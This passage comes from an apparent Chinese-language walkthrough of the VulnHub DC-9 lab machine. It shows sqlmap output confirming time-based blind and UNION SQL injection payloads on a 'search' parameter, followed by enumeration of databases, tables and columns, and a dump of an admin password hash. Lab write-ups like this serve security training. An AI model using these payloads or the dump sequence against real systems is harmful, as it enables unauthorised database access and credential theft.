class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 02:55:09 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:55:09] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing if POST parameter &#x27;search&#x27; is dynamic</span></span><br><span class="line"><span class="string">[02:55:10] [WARNING] POST parameter &#x27;search&#x27; does not appear to be dynamic</span></span><br><span class="line"><span class="string">[02:55:10] [WARNING] heuristic (basic) test shows that POST parameter &#x27;search&#x27; might not be injectable</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing for SQL injection on POST parameter &#x27;search&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Generic inline queries&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] POST parameter &#x27;search&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable </span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] target URL appears to be UNION injectable with 6 columns</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] POST parameter &#x27;search&#x27; is &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable</span></span><br><span class="line"><span class="string">POST parameter &#x27;search&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] fetching database names</span></span><br><span class="line"><span class="string">available databases [3]:</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string">[*] Staff</span></span><br><span class="line"><span class="string">[*] users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:55:31] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 02:55:31 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h3 id="4-扫描当前数据库，结果为Staff"><a href="#4-扫描当前数据库，结果为Staff" class="headerlink" title="4.扫描当前数据库，结果为Staff"></a>4.扫描当前数据库，结果为Staff</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt --dbs --batch --current-db</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [,]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 02:57:16 /2020-09-02/</span><br><span class="line"></span><br><span class="line">[02:57:16] [INFO] parsing HTTP request from <span class="string">&#x27;demo.txt&#x27;</span></span><br><span class="line">[02:57:16] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[02:57:16] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: search (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: search=1<span class="string">&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;</span>xHdu<span class="string">&#x27;=&#x27;</span>xHdu</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 6 columns</span><br><span class="line">    Payload: search=1<span class="string">&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[02:57:16] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[02:57:16] [INFO] fetching current database</span></span><br><span class="line"><span class="string">current database: &#x27;</span>Staff<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[02:57:17] [INFO] fetching database names</span></span><br><span class="line"><span class="string">available databases [3]:</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string">[*] Staff</span></span><br><span class="line"><span class="string">[*] users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:57:17] [INFO] fetched data logged to text files under &#x27;</span>/root/.<span class="built_in">local</span>/share/sqlmap/output/192.168.1.8<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 02:57:17 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h3 id="5-爆表，Users"><a href="#5-爆表，Users" class="headerlink" title="5.爆表，Users"></a>5.爆表，Users</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D Staff --tables --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 02:59:07 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:59:07] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[02:59:07] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[02:59:07] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[02:59:07] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[02:59:07] [INFO] fetching tables for database: &#x27;Staff&#x27;</span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">[2 tables]</span></span><br><span class="line"><span class="string">+--------------+</span></span><br><span class="line"><span class="string">| StaffDetails |</span></span><br><span class="line"><span class="string">| Users        |</span></span><br><span class="line"><span class="string">+--------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:59:07] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 02:59:07 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h3 id="6-爆字段"><a href="#6-爆字段" class="headerlink" title="6.爆字段"></a>6.爆字段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D Staff -T Users --column --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:02:44 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:02:44] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[03:02:44] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:02:44] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:02:44] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[03:02:44] [INFO] fetching columns for table &#x27;Users&#x27; in database &#x27;Staff&#x27;</span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">Table: Users</span></span><br><span class="line"><span class="string">[3 columns]</span></span><br><span class="line"><span class="string">+----------+-----------------+</span></span><br><span class="line"><span class="string">| Column   | Type            |</span></span><br><span class="line"><span class="string">+----------+-----------------+</span></span><br><span class="line"><span class="string">| Password | varchar(255)    |</span></span><br><span class="line"><span class="string">| UserID   | int(6) unsigned |</span></span><br><span class="line"><span class="string">| Username | varchar(255)    |</span></span><br><span class="line"><span class="string">+----------+-----------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:02:44] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:02:44 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h3 id="7-爆数据"><a href="#7-爆数据" class="headerlink" title="7.爆数据"></a>7.爆数据</h3><p><code>得到admin与hash值</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D Staff -T Users -C Username,Password --dump --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&#x27;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:04:03 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:04:03] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:04:03] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] fetching entries of column(s) &#x27;Password, Username&#x27; for table &#x27;Users&#x27; in database &#x27;Staff&#x27;</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] recognized possible password hashes in column &#x27;Password&#x27;</span></span><br><span class="line"><span class="string">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N</span></span><br><span class="line"><span class="string">do you want to crack them via a dictionary-based attack? [Y/n/q] Y</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] using hash method &#x27;md5_generic_passwd&#x27;</span></span><br><span class="line"><span class="string">what dictionary do you want to use?</span></span><br><span class="line"><span class="string">[1] default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)</span></span><br><span class="line"><span class="string">[2] custom dictionary file</span></span><br><span class="line"><span class="string">[3] file with list of dictionary files</span></span><br><span class="line"><span class="string">&gt; 1</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] using default dictionary</span></span><br><span class="line"><span class="string">do you want to use common password suffixes? (slow!) [y/N] N</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] starting 4 processes </span></span><br><span class="line"><span class="string">[03:04:15] [WARNING] no clear password(s) found                                                                                                  </span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">Table: Users</span></span><br><span class="line"><span class="string">[1 entry]</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br><span class="line"><span class="string">| Username | Password                         |</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br><span class="line"><span class="string">| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:04:15] [INFO] table &#x27;Staff.Users&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.1.8/dump/Staff/Users.csv&#x27;</span></span><br><span class="line"><span class="string">[03:04:15] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:04:15 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h3 id="8-其他用户信息"><a href="#8-其他用户信息" class="headerlink" title="8.其他用户信息"></a>8.其他用户信息</h3><p><code>之前web界面发现有用户信息，之后又爆出users数据库，所以推测user数据库存放的是用户信息</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D users -T UserDetails -C username,password --dump --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:12:26 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:12:26] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:12:26] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] fetching entries of column(s) &#x27;password, username&#x27; for table &#x27;UserDetails&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">Table: UserDetails</span></span><br><span class="line"><span class="string">[17 entries]</span></span><br><span class="line"><span class="string">+-----------+---------------+</span></span><br><span class="line"><span class="string">| username  | password      